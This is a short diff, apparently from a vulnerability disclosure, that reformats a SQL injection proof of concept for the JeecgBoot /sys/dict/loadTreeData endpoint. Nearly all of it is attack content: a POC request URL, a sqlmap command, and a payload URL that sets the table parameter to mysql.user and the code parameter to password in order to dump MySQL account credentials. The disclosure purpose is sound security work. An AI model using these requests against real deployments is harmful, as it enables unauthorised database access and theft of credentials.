@@ -56,8 +56,10 @@ src/main/java/org/jeecg/modules/system/mapper/xml/SysDictMapper.xml
 POC:
 http://localhost:8080/sys/dict/loadTreeData?pid=1&pidField=1&tableName=1&text=1&code=1&hasChildField=1&condition=1
 
-payload1:Use sqlmap for injection after login
+payload1:
+Use sqlmap for injection after login:
 sqlmap -r 1.txt
 
-payload2:Query mysql system table
+payload2:
+Query mysql system table:
 http://localhost:8080/sys/dict/loadTreeData?pid=1&pidField=1&tableName=mysql.user&text=User&code=password&hasChildField=1&condition=
